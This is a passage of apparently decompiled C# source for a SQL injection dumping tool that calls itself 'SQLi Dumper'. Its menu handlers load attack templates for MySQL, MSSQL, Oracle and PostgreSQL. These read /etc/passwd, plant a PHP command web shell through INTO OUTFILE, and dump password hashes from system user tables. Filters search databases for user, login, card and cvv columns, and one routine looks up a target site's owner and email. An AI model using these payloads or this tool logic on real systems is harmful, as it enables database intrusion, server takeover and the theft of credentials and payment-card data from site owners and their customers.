					_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery_0024Init.State = 1;
					if (lockTaken3)
					{
						Monitor.Exit(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery_0024Init);
					}
				}
				txtCustomQuery.Text = _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery;
				_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery = txtCustomQuery.Text;
				mnuTemplates.DropDown = ctmTemplatesMSSQL;
			}
			else if (flag5 == flag3)
			{
				if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2_0024Init == null)
				{
					Interlocked.CompareExchange(ref _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2_0024Init, new StaticLocalInitFlag(), null);
				}
				bool lockTaken4 = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2_0024Init, ref lockTaken4);
					if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2_0024Init.State == 0)
					{
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2_0024Init.State = 2;
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2 = txtCustomQuery.Text;
					}
					else if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2_0024Init.State = 1;
					if (lockTaken4)
					{
						Monitor.Exit(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2_0024Init);
					}
				}
				txtCustomQuery.Text = _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2;
				_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery2 = txtCustomQuery.Text;
				mnuTemplates.DropDown = ctmTemplatesOracle;
			}
			else if (flag5 == flag4)
			{
				if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3_0024Init == null)
				{
					Interlocked.CompareExchange(ref _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3_0024Init, new StaticLocalInitFlag(), null);
				}
				bool lockTaken5 = false;
				try
				{
					Monitor.Enter(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3_0024Init, ref lockTaken5);
					if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3_0024Init.State == 0)
					{
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3_0024Init.State = 2;
						_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3 = txtCustomQuery.Text;
					}
					else if (_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3_0024Init.State == 2)
					{
						throw new IncompleteInitialization();
					}
				}
				finally
				{
					_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3_0024Init.State = 1;
					if (lockTaken5)
					{
						Monitor.Exit(_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3_0024Init);
					}
				}
				txtCustomQuery.Text = _0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3;
				_0024STATIC_0024cmbSqlType_SelectedIndexChanged_002420211C12819D_0024sQuery3 = txtCustomQuery.Text;
				mnuTemplates.DropDown = ctmTemplatesPostgreSQL;
			}
		}
		Globals.LockWindowUpdate(IntPtr.Zero);
	}

	private void method_100(object sender, EventArgs e)
	{
	}

	private void method_101(object sender, EventArgs e)
	{
		txtPost.Enabled = cmbMethod.SelectedIndex == 1;
	}

	private void method_102(object sender, EventArgs e)
	{
		if (Class54.smethod_9(types_0))
		{
			lblFrom.Visible = !txtCustomQueryFrom.Text.ToLower().Contains("into outfile") & !txtCustomQueryFrom.Text.ToLower().Contains("into dumpfile") & !string.IsNullOrEmpty(txtCustomQueryFrom.Text);
		}
	}

	private void method_103(object sender, EventArgs e)
	{
		if (Class54.smethod_9(types_0))
		{
			txtCustomQuery.Clear();
			txtCustomQueryFrom.Clear();
		}
		else
		{
			txtCustomQuery.Clear();
		}
	}

	private void method_104(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "@@hostname,\r\n@@datadir";
		txtCustomQueryFrom.Text = "";
	}

	private void method_105(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "grantee,\r\nprivilege_type,\r\nis_grantable";
		txtCustomQueryFrom.Text = "information_schema.user_privileges\r\nwhere privilege_type=0x5355504552\r\nlimit [x],[y]";
	}

	private void method_106(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "md5(user()),sha1(user()),password(user())";
		txtCustomQueryFrom.Text = "";
	}

	private void method_107(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "user(),database(),version()";
		txtCustomQueryFrom.Text = "";
	}

	private void method_108(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "load_file(0x2f6574632f706173737764),\r\nlength(load_file(0x2f6574632f706173737764))";
		txtCustomQueryFrom.Text = "";
	}

	private void method_109(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "'<? system($_REQUEST['cmd']); ?>'";
		txtCustomQueryFrom.Text = "into outfile '/var/www/html/site_com/evil.php'";
	}

	private void method_110(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "hex('powered by SQLi Dumper')";
		txtCustomQueryFrom.Text = "into dumpfile '/etc/passwd/a.bin'";
	}

	private void method_111(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "grantee,\r\nprivilege_type,\r\nis_grantable";
		txtCustomQueryFrom.Text = "information_schema.user_privileges\r\nlimit [x],[y]";
	}

	private void method_112(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "host,\r\nuser,\r\npassword";
		txtCustomQueryFrom.Text = "mysql.user\r\nlimit [x],[y]";
	}

	private void method_113(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "C.table_schema,\r\nC.table_name,\r\nC.column_name";
		txtCustomQueryFrom.Text = "information_schema.columns AS C\r\nwhere C.column_name like " + Class23.smethod_20("%user%") + "\r\nand not C.table_schema in (0x696e666f726d6174696f6e5f736368656d61,0x6d7973716c)\r\nlimit [x],[y]";
	}

	private void method_114(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "C.table_schema,\r\nC.table_name,\r\nC.column_name";
		txtCustomQueryFrom.Text = "information_schema.columns AS C\r\nwhere C.column_name LIKE " + Class23.smethod_20("%cvv%") + "\r\nlimit [x],[y]";
	}

	private void method_115(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "D.schema_name,\r\nT.table_name,\r\nC.column_name";
		txtCustomQueryFrom.Text = "information_schema.schemata AS D\r\nJOIN information_schema.tables AS T ON T.table_schema = D.schema_name\r\nJOIN information_schema.columns AS C ON C.table_schema = D.schema_name AND C.table_name = T.table_name\r\nWHERE D.schema_name = database()\r\nlimit [x],[y]";
	}

	private void method_116(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "LENGTH(DATABASE())";
		txtCustomQueryFrom.Clear();
	}

	private void method_117(object sender, EventArgs e)
	{
		txtCustomQueryFrom.Text += "\r\nlimit [x],[y]";
	}

	private void method_118(object sender, CancelEventArgs e)
	{
		bool flag = Class54.smethod_9(types_0);
		bool flag2 = Class54.smethod_10(types_0);
		bool flag3 = Class54.smethod_11(types_0);
		bool flag4 = Class54.smethod_12(types_0);
		_ = types_0 == Types.MySQL_With_Error;
		List<ToolStripMenuItem> list = new List<ToolStripMenuItem>();
		if (trwSchema.SelectedNode == null)
		{
			if (flag)
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("information_schema");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("  schema");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("    schema_name");
				list.Add(toolStripMenuItem);
			}
			else if (flag2)
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("master");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("  sysdatabases");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("    [name]");
				list.Add(toolStripMenuItem);
			}
			else if (flag3)
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("SYS");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("  all_tables");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("    owner");
				list.Add(toolStripMenuItem);
			}
			else if (flag4)
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("pg_database");
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				toolStripMenuItem = new ToolStripMenuItem("  datname");
				list.Add(toolStripMenuItem);
			}
		}
		else
		{
			_ = trwSchema.SelectedNode.Level;
			switch (trwSchema.SelectedNode.Level)
			{
			case 0:
				if (flag)
				{
					ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("information_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    schema_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("  tables");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_schema");
					list.Add(toolStripMenuItem);
				}
				else if (flag2)
				{
					ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("master");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  sysdatabases");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    [name]");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("  sysobjects");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    [name]");
					list.Add(toolStripMenuItem);
				}
				else if (flag3)
				{
					ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("SYS");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  all_tables");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    owner");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("  all_tab_columns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
				}
				else if (flag4)
				{
					ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("pg_database");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  datname");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("information_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  tables");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  table_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("  table_catalog");
					list.Add(toolStripMenuItem);
				}
				break;
			case 1:
				if (flag)
				{
					ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("information_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  columns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    column_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
				}
				else if (flag2)
				{
					ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("master");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  syscolumns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    [name]");
					list.Add(toolStripMenuItem);
				}
				else if (flag3)
				{
					ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("SYS");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  all_tab_columns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    column_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    owner");
					list.Add(toolStripMenuItem);
				}
				else if (flag4)
				{
					ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem("information_schema");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("  columns");
					list.Add(toolStripMenuItem);
					toolStripMenuItem.Enabled = false;
					toolStripMenuItem = new ToolStripMenuItem("    column_name");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_catalog");
					list.Add(toolStripMenuItem);
					toolStripMenuItem = new ToolStripMenuItem("    table_name");
					list.Add(toolStripMenuItem);
				}
				break;
			case 2:
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem(trwSchema.SelectedNode.Parent.Text);
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				foreach (TreeNode node in trwSchema.SelectedNode.Parent.Nodes)
				{
					toolStripMenuItem = new ToolStripMenuItem("  " + node.Text);
					list.Add(toolStripMenuItem);
				}
				break;
			}
			case 3:
			{
				ToolStripMenuItem toolStripMenuItem = new ToolStripMenuItem(trwSchema.SelectedNode.Parent.Parent.Text);
				list.Add(toolStripMenuItem);
				toolStripMenuItem.Enabled = false;
				foreach (TreeNode node2 in trwSchema.SelectedNode.Parent.Parent.Nodes)
				{
					toolStripMenuItem = new ToolStripMenuItem("  " + node2.Text);
					list.Add(toolStripMenuItem);
				}
				break;
			}
			}
		}
		foreach (ToolStripMenuItem item in list)
		{
			item.Click += method_125;
		}
		ctmSchema.Items.Clear();
		ctmSchema.Items.AddRange(list.ToArray());
	}

	private void method_119(object sender, EventArgs e)
	{
		Globals.LockWindowUpdate(splSchema.Handle);
		txtSchemaWhere.Enabled = chkDumpWhere.Checked;
		txtSchemaOrderBy.Enabled = chkDumpOrderBy.Checked;
		tsConvert1.Visible = chkDumpWhere.Checked | chkDumpOrderBy.Checked;
		splSchema.Panel2Collapsed = !chkDumpWhere.Checked & !chkDumpOrderBy.Checked;
		splWhere.Panel1Collapsed = !chkDumpWhere.Checked;
		splWhere.Panel2Collapsed = !chkDumpOrderBy.Checked;
		if (!(splWhere.Panel1Collapsed & splWhere.Panel2Collapsed))
		{
			splWhere.SplitterDistance = checked((int)Math.Round((double)splWhere.Height / 2.0));
		}
		Globals.LockWindowUpdate(IntPtr.Zero);
	}

	private void method_120(object sender, EventArgs e)
	{
		bool flag;
		if ((flag = true) == (sender == mnuFilters1))
		{
			txtSchemaWhere.Text = "schema_name = database()";
		}
		else if (flag == (sender == mnuFilters2))
		{
			txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%user%");
		}
		else if (flag == (sender == mnuFilters5))
		{
			txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%admin%");
		}
		else if (flag == (sender == mnuFilters6))
		{
			txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%login%");
		}
		else if (flag == (sender == mnuFilters7))
		{
			txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%customer%");
		}
		else if (flag == (sender == mnuFilters8))
		{
			txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%sale%");
		}
		else if (flag == (sender == mnuFilters9))
		{
			txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%mail%");
		}
		else if (flag == (sender == mnuFilters10))
		{
			txtSchemaWhere.Text = "table_name like " + Class23.smethod_20("%card%");
		}
		else if (flag == (sender == mnuFilters3))
		{
			txtSchemaWhere.Text = "not column_name is null";
		}
		txtSchemaWhere.Focus();
	}

	private void method_121(object sender, EventArgs e)
	{
		if (sender == btnFiltersClear1)
		{
			txtSchemaWhere.Clear();
		}
	}

	private void method_122(object sender, CancelEventArgs e)
	{
		mnuConvLEN.Visible = txtSchemaWhere.Focused;
		bool flag;
		if ((flag = true) == Class54.smethod_9(types_0) || flag == Class54.smethod_10(types_0))
		{
			mnuConvLEN.Text = "LENGTH(column)>1";
		}
		else
		{
			mnuConvLEN.Text = "LEN(column)>1";
		}
	}

	private void method_123(object sender, EventArgs e)
	{
		int selectionStart = txtSchemaWhere.SelectionStart;
		string text = "";
		bool flag;
		text = (((flag = true) != Class54.smethod_9(types_0) && flag != Class54.smethod_10(types_0)) ? Class23.smethod_21("%@%", bool_0: false, "+", "chr") : Class23.smethod_20("%@%"));
		txtSchemaWhere.Text = txtSchemaWhere.Text.Insert(selectionStart, text);
		txtSchemaWhere.SelectionStart = checked(selectionStart + text.Length);
		txtSchemaWhere.SelectionLength = 0;
		txtSchemaWhere.Focus();
	}

	private void method_124(object sender, EventArgs e)
	{
		try
		{
			string text = "";
			TextBox textBox = null;
			bool flag;
			if ((flag = true) == txtSchemaWhere.Focused)
			{
				textBox = txtSchemaWhere;
			}
			else if (flag == txtSchemaOrderBy.Focused)
			{
				textBox = txtSchemaOrderBy;
			}
			else if (flag == txtCustomQuery.Focused)
			{
				textBox = txtCustomQuery;
			}
			else
			{
				if (flag != txtCustomQueryFrom.Focused)
				{
					return;
				}
				textBox = txtCustomQueryFrom;
			}
			bool flag2;
			if (textBox.SelectedText.Length > 0)
			{
				text = textBox.SelectedText;
			}
			else
			{
				flag2 = true;
			}
			if (flag2 = string.IsNullOrEmpty(text.Trim()))
			{
				using ImpBox impBox = new ImpBox();
				impBox.Text = Globals.translate_0.GetStr(this, 62);
				impBox.txtValue.Text = "";
				impBox.ShowDialog(this);
				text = ((impBox.DialogResult != DialogResult.OK) ? "" : impBox.txtValue.Text.Trim());
			}
			if (string.IsNullOrEmpty(text))
			{
				return;
			}
			bool flag3;
			if ((flag3 = true) == (sender == mnuConvHex))
			{
				text = Class23.smethod_20(text);
			}
			else if (flag3 == (sender == mnuConvChar))
			{
				switch (Class54.smethod_6(cmbSqlType.Text))
				{
				default:
					text = Class23.smethod_21(text, bool_0: false);
					break;
				case Types.Oracle_No_Error:
				case Types.Oracle_With_Error:
				case Types.PostgreSQL_No_Error:
				case Types.PostgreSQL_With_Error:
					text = Class23.smethod_21(text, bool_0: false, "||", "chr");
					break;
				}
			}
			else if (flag3 == (sender == mnuConvCharGroup))
			{
				text = Class23.smethod_21(text, bool_0: true);
			}
			else if (flag3 == (sender == mnuConvLEN))
			{
				text = ((!Class54.smethod_9(types_0)) ? ("LEN(" + text + ")>1") : ("LENGTH(" + text + ")>1"));
			}
			int[] array = new int[2] { textBox.SelectionStart, 0 };
			if (!flag2)
			{
				array[1] = textBox.SelectionLength;
				textBox.Text = textBox.Text.Remove(array[0], array[1]);
			}
			textBox.Text = textBox.Text.Insert(array[0], text);
			textBox.SelectionStart = checked(array[0] + text.Length);
			textBox.SelectionLength = 0;
			textBox.Focus();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			ProjectData.ClearProjectError();
		}
	}

	private void method_125(object sender, EventArgs e)
	{
		try
		{
			bool flag;
			TextBox textBox;
			if ((flag = true) == txtSchemaWhere.Focused)
			{
				textBox = txtSchemaWhere;
			}
			else
			{
				if (flag != txtSchemaOrderBy.Focused)
				{
					return;
				}
				textBox = txtSchemaOrderBy;
			}
			string text = Conversions.ToString(textBox.SelectionStart);
			textBox.Text = textBox.Text.Insert(Conversions.ToInteger(text), Conversions.ToString(NewLateBinding.LateGet(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null), null, "Trim", new object[0], null, null, null)));
			textBox.SelectionStart = Conversions.ToInteger(Operators.AddObject(text, NewLateBinding.LateGet(NewLateBinding.LateGet(sender, null, "Text", new object[0], null, null, null), null, "Length", new object[0], null, null, null)));
			textBox.SelectionLength = 0;
			textBox.Focus();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			MessageBox.Show(ex2.Message, Text, MessageBoxButtons.OK, MessageBoxIcon.Hand);
			ProjectData.ClearProjectError();
		}
	}

	private void method_126(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "SELECT TOP 1 CAST(ISNULL([name],CHAR(32)) AS NVARCHAR(4000))\r\nFROM (SELECT DISTINCT TOP [x] [name] FROM [master]..[syslogins] ORDER BY [name] ASC)\r\nsq ORDER BY [name] DESC";
	}

	private void method_127(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "SELECT CAST(ISNULL(is_srvrolemember(0x73797361646d696e),CHAR(32)) AS NVARCHAR(4000))";
	}

	private void method_128(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "SELECT TOP 1 X\r\nFROM (\r\n\tSELECT DISTINCT TOP [x] (D.name+[s]+T.name+[s]+C.name) as X\r\n\tFROM [master]..[sysdatabases] AS D\r\n\tJOIN sysobjects T ON D.dbid = T.uid \r\n\tJOIN syscolumns AS C ON T.id = C.id\r\n\tORDER BY X ASC\r\n)\r\nsq ORDER BY X DESC";
	}

	private void method_129(object sender, EventArgs e)
	{
		using (new Class8(Globals.GMain))
		{
			MessageBox.Show("MS SQL does not support a SQL statement to limiting the rows.\r\nBut we can use the method of ordering 'ORDER BY ASC/DESC'!\r\nTake this example:\r\n\r\nSELECT TOP 1 ([name]+[s]+[password]) As t\r\nFROM [DB]..[TABLE]\r\nWHERE [name] = (\r\n\tSELECT TOP 1 [name] FROM (\r\n\t\tSELECT DISTINCT TOP [x] [name]\r\n\t\tFROM [DB]..[TABLE]\r\n\t\tORDER BY [name] ASC)\r\n\tsq ORDER BY [name] DESC)\r\n\r\nAs this example show, you can use the variables:\r\n\t[x] = for a index limit method, to dump in loops\r\n\t[s] = for a split column used by dump grid\r\nWHEN YOU SEE REPEATED DATA, STOP THE JOB\r\nIt is necessary because the application can not determine how much rows are affected.\r\nAnd with a 'SELECT TOP .. ORDER BY .. ASC/DESC' WILL ALWAYS RETURN DATA!\r\n\r\nIMPORTANT:\r\nYou can't use the ',' to separate the columns\r\nUse the statement 'SELECT (column1+[s]+column2) as t'...", "Query Help", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}

	private void method_130(object sender, EventArgs e)
	{
		using (new Class8(Globals.GMain))
		{
			MessageBox.Show("You can't use the '+' or '/**/' (use only spaces)\r\nYou do not need to add 'SELECT' and 'FROM' keyword\r\n\r\nTake this example:\r\nSELECT column1, column2\r\nFROM DB.Table\r\nWHERE column1 = hex_or_char\r\nORDER By column1 DESC, column2 ASC\r\nLIMIT [x],[y]\r\n\r\nFor limiting SQL statement, you can use the variables variables [x],[y]", "Query Help", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}

	private void method_131(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "SELECT U [s] R\r\nFROM (\r\n\tSELECT ROWNUM R, username AS U\r\n\tFROM all_users\r\n)\r\nWHERE R = [x]";
	}

	private void method_132(object sender, EventArgs e)
	{
		using (new Class8(Globals.GMain))
		{
			MessageBox.Show("Oracle does not support a SQL statement to limiting the rows.\r\n\r\nFrom Oracle 9i onwards, the RANK() and DENSE_RANK() functions can be used to determine the TOP N rows. Examples:\r\n\r\nSELECT column1 \r\nFROM (\r\n\tSELECT column1, RANK() OVER (ORDER BY column1 DESC) sal_dense_rank FROM table1\r\n)\r\nWHERE sal_dense_rank  = [x]\r\n(PS: DENSE_RANK() can be used)\r\n\r\nOR\r\n\r\nSELECT column1 \r\nFROM (\r\n\tSELECT ROWNUM R, column1 FROM table1) \r\n)\r\nWHERE R = [x]\r\n\r\nAs this example show, you can use the variables:\r\n\t[x] = for a index limit method, to dump in loops\r\n\t[s] = for a split column used by dump grid\r\n\r\nIMPORTANT:\r\nYou can't use the ',' to separate the columns\r\nUse the statement 'SELECT (column1 [s] column2) as t'...\r\nWHEN YOU SEE REPEATED DATA, STOP THE JOB\r\nIt is necessary because the application can not determine how much rows are affected.", "Query Help", MessageBoxButtons.OK, MessageBoxIcon.Asterisk);
		}
	}

	private void method_133(object sender, EventArgs e)
	{
		if (lblVersion.Text.Contains("10"))
		{
			txtCustomQuery.Text = "SELECT N\r\nFROM (\r\n\tSELECT ROWNUM R, (name [s] password [s] astatus) AS N\r\n\tFROM sys.user$\r\n)\r\nWHERE R = [x]";
		}
		else
		{
			txtCustomQuery.Text = "SELECT N\r\nFROM (\r\n\tSELECT ROWNUM R, (name [s] spare4) AS N\r\n\tFROM sys.user$\r\n)\r\nWHERE R = [x]";
		}
	}

	private void method_134(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "SELECT U [s] R\r\nFROM (\r\n\tSELECT ROWNUM R, username AS U\r\n\tFROM all_users\r\n)\r\nWHERE R = [x]";
	}

	private void method_135(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "SELECT usename\r\nFROM pg_user\r\nLIMIT 1 OFFSET [x]";
	}

	private void method_136(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "SELECT usename [s] passwd\r\nFROM pg_shadow\r\nLIMIT 1 OFFSET [x]";
	}

	private void method_137(object sender, EventArgs e)
	{
		txtCustomQuery.Text = "SELECT DISTINCT C.relname [s] A.attnum\r\nFROM pg_class C, pg_namespace N, pg_attribute A, pg_type T\r\nWHERE (C.relkind=Chr(114))\r\n\tAND (N.oid=C.relnamespace)\r\n\tAND (A.attrelid=C.oid)\r\n\tAND (A.atttypid=T.oid)\r\n\tAND (A.attnum>0)\r\n\tAND (NOT A.attisdropped) \r\n\tAND (N.nspname LIKE Chr(112)||Chr(117)||Chr(98)||Chr(108)||Chr(105)||Chr(99))\r\nLIMIT 1 OFFSET [x]";
	}

	private void method_138(object sender, DoWorkEventArgs e)
	{
		StringBuilder stringBuilder = new StringBuilder();
		try
		{
			string arg = Class23.smethod_11(Conversions.ToString(e.Argument));
			string text = $"http://data.alexa.com/data?cli=10&dat=snbamz&url={arg}";
			Class51 @class = new Class51(text);
			stringBuilder.AppendLine("Country: ".PadLeft(18, ' ') + @class.method_3("COUNTRY", "CODE", "N/A") + " - " + @class.method_3("COUNTRY", "NAME", "N/A"));
			stringBuilder.AppendLine("Rank: ".PadLeft(18, ' ') + @class.method_3("COUNTRY", "RANK", "N/A"));
			stringBuilder.AppendLine("Reach: ".PadLeft(18, ' ') + @class.method_3("REACH", "RANK", "N/A"));
			stringBuilder.AppendLine("Delta: ".PadLeft(18, ' ') + @class.method_3("RANK", "DELTA", "N/A"));
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("Host: ".PadLeft(18, ' ') + @class.method_3("SD", "HOST", "N/A"));
			stringBuilder.AppendLine("Linked: ".PadLeft(18, ' ') + @class.method_3("LINKSIN", "NUM", "N/A"));
			stringBuilder.AppendLine("Title: ".PadLeft(18, ' ') + @class.method_3("TITLE", "TEXT", "N/A"));
			stringBuilder.AppendLine("Description: ".PadLeft(18, ' ') + @class.method_3("SITE", "DESC", "N/A"));
			stringBuilder.AppendLine("Created: ".PadLeft(18, ' ') + @class.method_3("CREATED", "DATE", "N/A"));
			stringBuilder.AppendLine("ID: ".PadLeft(18, ' ') + @class.method_3("CAT", "ID", "N/A"));
			stringBuilder.AppendLine("City: ".PadLeft(18, ' ') + @class.method_3("ADDR", "CITY", "N/A"));
			stringBuilder.AppendLine("Owner: ".PadLeft(18, ' ') + @class.method_3("OWNER", "NAME", "N/A"));
			stringBuilder.Append("Email: ".PadLeft(18, ' ') + @class.method_3("EMAIL", "ADDR", "N/A"));
			@class = null;
			e.Result = stringBuilder.ToString();
		}
		catch (Exception ex)
		{
			ProjectData.SetProjectError(ex);
			Exception ex2 = ex;
			e.Result = ex2.Message;
			ProjectData.ClearProjectError();
		}
	}

	private void method_139(object sender, RunWorkerCompletedEventArgs e)
	{
		if (e.Error != null)
		{
			MessageBox.Show(e.Error.Message);
		}
		else if (MessageBox.Show(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(e.Result, "\r\n"), "\r\n"), Globals.translate_0.GetStr(Globals.GMain, 64))), Globals.APP_VERSION, MessageBoxButtons.YesNo, MessageBoxIcon.Asterisk, MessageBoxDefaultButton.Button2) == DialogResult.Yes)
		{
